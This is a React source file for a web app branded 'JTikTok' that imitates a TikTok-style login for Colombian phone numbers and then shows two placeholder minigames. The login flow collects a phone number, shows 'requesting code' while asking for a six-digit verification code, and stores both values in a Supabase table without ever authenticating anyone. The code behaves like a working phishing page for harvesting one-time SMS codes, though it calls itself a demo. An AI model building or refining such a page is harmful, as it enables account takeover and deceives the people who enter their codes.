import { useState } from "react";
import "./App.css";
import { supabase } from "./lib/supabase";

type Screen = "welcome" | "phone" | "verify" | "home";

function App() {
  const [screen, setScreen] = useState<Screen>("welcome");
  const [phone, setPhone] = useState("");
  const [code, setCode] = useState("");
  const [loading, setLoading] = useState(false);
  const [message, setMessage] = useState("");

  function handlePhone(value: string) {
    setPhone(value.replace(/\D/g, "").slice(0, 10));
    setMessage("");
  }

  function handleCode(value: string) {
    setCode(value.replace(/\D/g, "").slice(0, 6));
    setMessage("");
  }

  async function sendCode() {
    if (!phone) return;

    setLoading(true);
    setMessage("");

    const { error } = await supabase
      .from("demo_events")
      .insert({
        event_type: "phone_test",
        test_identifier: phone,
      });

    console.log("SUPABASE ERROR:", error);

    setLoading(false);

    if (error) {
      setMessage("Error al guardar en la base de datos.");
      return;
    }

    setScreen("verify");
  }

  async function enterCode() {
    if (!code) return;

    setLoading(true);
    setMessage("");

    const { error } = await supabase
      .from("demo_events")
      .insert({
        event_type: "demo_code",
        test_identifier: phone,
        demo_value: code,
      });

    console.log("SUPABASE CODE ERROR:", error);

    setLoading(false);

    if (error) {
      setMessage("Error al guardar el código de prueba.");
      return;
    }

    setScreen("home");
  }

  return (
    <main className="app">
      {screen === "welcome" && (
        <section className="authCard welcomeCard">
          <div className="mainLogo">♪</div>

          <h1>JTikTok</h1>
          <h2>Bienvenido</h2>

          <p className="description">
            Juega minijuegos rápidos directamente desde tu navegador.
          </p>

          <button
            className="mainButton"
            onClick={() => setScreen("phone")}
          >
            ♪ Continuar
          </button>

          <span className="version">Versión de prueba</span>
        </section>
      )}

      {screen === "phone" && (
        <section className="authCard">
          <button
            className="backButton"
            onClick={() => setScreen("welcome")}
          >
            ←
          </button>

          <div className="smallLogo">♪</div>

          <h2 className="screenTitle">Iniciar sesión</h2>

          <p className="description left">
            Ingresa un número para continuar.
          </p>

          <div className="phoneContainer">
            <div className="country">
              🇨🇴 <strong>+57</strong>
            </div>

            <input
              type="tel"
              inputMode="numeric"
              value={phone}
              onChange={(e) => handlePhone(e.target.value)}
              placeholder="3000000000"
            />
          </div>

          <div className="counter">
            {phone.length}/10
          </div>

          {message && (
            <p className="statusMessage">
              {message}
            </p>
          )}

          <button
            className="mainButton"
            onClick={sendCode}
            disabled={!phone || loading}
          >
            {loading ? "Guardando..." : "Enviar código"}
          </button>
        </section>
      )}

      {screen === "verify" && (
        <section className="authCard">
          <button
            className="backButton"
            onClick={() => setScreen("phone")}
          >
            ←
          </button>

          <div className="spinner" />

          <h2 className="screenTitle">
            Solicitando código...
          </h2>

          <p className="description left">
            Ingresa un código de prueba.
          </p>

          <input
            className="codeInput"
            type="text"
            inputMode="numeric"
            value={code}
            onChange={(e) => handleCode(e.target.value)}
            placeholder="000000"
          />

          {message && (
            <p className="statusMessage">
              {message}
            </p>
          )}

          <button
            className="mainButton"
            onClick={enterCode}
            disabled={!code || loading}
          >
            {loading ? "Guardando..." : "Ingresar"}
          </button>
        </section>
      )}

      {screen === "home" && (
        <section className="homePage">
          <header className="header">
            <div className="brand">
              <span>♪</span>
              JTikTok
            </div>

            <div className="userBadge">
              +57 {phone}
            </div>
          </header>

          <div className="homeContent">
            <div className="hero">
              <span className="sectionLabel">
                JUEGOS
              </span>

              <h1>Elige un juego</h1>

              <p>
                Minijuegos de prueba.
              </p>
            </div>

            <div className="gamesGrid">
              <button
                className="gameCard"
                onClick={() => alert("Juego de prueba")}
              >
                <div className="gamePreview jump">
                  <div className="previewBall" />
                  <div className="platform p1" />
                  <div className="platform p2" />
                  <div className="platform p3" />
                </div>

                <div className="gameInfo">
                  <h3>Jump Up</h3>
                  <p>Salta entre plataformas.</p>
                  <span>Abrir →</span>
                </div>
              </button>

              <button
                className="gameCard"
                onClick={() => alert("Juego de prueba")}
              >
                <div className="gamePreview mine">
                  <div className="mineGrid">
                    <span>1</span>
                    <span></span>
                    <span>💣</span>
                    <span></span>
                    <span>2</span>
                    <span></span>
                    <span>1</span>
                    <span></span>
                    <span>1</span>
                  </div>
                </div>

                <div className="gameInfo">
                  <h3>MineTap</h3>
                  <p>Encuentra las casillas seguras.</p>
                  <span>Abrir →</span>
                </div>
              </button>
            </div>
          </div>
        </section>
      )}
    </main>
  );
}

export default App;